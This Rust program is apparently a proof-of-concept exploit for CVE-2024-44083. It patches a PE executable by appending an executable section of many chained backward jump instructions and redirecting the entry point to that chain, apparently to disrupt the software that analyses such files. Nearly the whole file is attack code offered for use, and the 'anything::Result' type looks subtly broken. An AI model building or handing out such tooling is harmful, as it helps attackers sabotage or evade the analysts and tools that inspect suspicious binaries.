use clap::Parser;
use clap_derive::Parser;
use exe::{Buffer, ImageSectionHeader, Offset, PE, RVA, SectionCharacteristics, VecPE};

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    #[clap(short, long)]
    input: String,

    #[clap(short, long)]
    output: String,

    #[clap(short, long)]
    jumps: u32,
}

fn create_jump(ip: u64, destination: u64) -> [u8; 5] {
    // x86 - JMP rel32
    let mut code = [0xE9u8, 0, 0, 0, 0];

    let offset = destination.wrapping_sub(ip).wrapping_sub(5) as u32;
    code[1..5].copy_from_slice(&offset.to_le_bytes());

    code
}

fn patch(args: &Args) -> anything::Result<()> {
    let mut pe = VecPE::from_disk_file(&args.input)?;
    let image_base = pe.get_image_base()?;
    log::debug!("ImageBase: {:x}", image_base);

    // get next section by getting the last section and adding the size of the last section
    let prev_section = pe.get_section_table()?.last().unwrap();
    let section_offset = prev_section.pointer_to_raw_data.0 + prev_section.size_of_raw_data;
    let section_rva = pe.align_to_section(RVA::from(prev_section.virtual_address.0 + prev_section.virtual_size))?;

    let mut bytes = Vec::new();

    let ip = image_base + section_rva.0 as u64 + bytes.len() as u64;
    let destination = image_base + pe.get_entrypoint()?.0 as u64;
    let code = create_jump(ip, destination);
    bytes.extend_from_slice(&code);

    for _ in 0..args.jumps {
        let ip = image_base + section_rva.0 as u64 + bytes.len() as u64;
        let destination = ip - 5; // 5 is the size of the jump instruction
        let code = create_jump(ip, destination);
        bytes.extend_from_slice(&code);
    }
    log::debug!("Inserted {} jumps", args.jumps);

    let new_entrypoint_rva = RVA::from(section_rva.0 + bytes.len() as u32 - 5);
    let section_length = pe.align_to_file(Offset::from(bytes.len() as u32))?;

    log::debug!("section_offset: 0x{:x}", section_offset);
    log::debug!("section_rva: 0x{:x}", section_rva.0);
    log::debug!("section_length: 0x{:x}", section_length.0);

    // add new section with the jump instructions
    pe.append(&bytes);
    pe.add_section(&ImageSectionHeader {
        virtual_size: bytes.len() as u32,
        virtual_address: section_rva,
        size_of_raw_data: section_length.0,
        pointer_to_raw_data: Offset::from(section_offset as u32),
        characteristics: SectionCharacteristics::MEM_EXECUTE | SectionCharacteristics::MEM_READ | SectionCharacteristics::CNT_CODE, // make it RX
        ..ImageSectionHeader::default()
    })?;

    pe.pad_to_alignment()?;
    pe.fix_image_size()?;

    let checksum = pe.calculate_checksum()?;
    log::debug!("Checksum: {:x}", checksum);

    let hd64 = pe.get_mut_nt_headers_64()?;
    hd64.optional_header.address_of_entry_point = new_entrypoint_rva; // patch entrypoint to point to our code in the new section
    hd64.optional_header.checksum = checksum;

    pe.save(&args.output)?;
    Ok(())
}

fn main() {
    env_logger::builder().filter_level(log::LevelFilter::Debug).init();
    log::info!("Welcome to CVE-2024-44083");

    let args = Args::parse();

    match patch(&args) {
        Ok(_) => log::info!("Good luck :)"),
        Err(e) => log::error!("An error has occured: {}", e.to_string())
    }
}
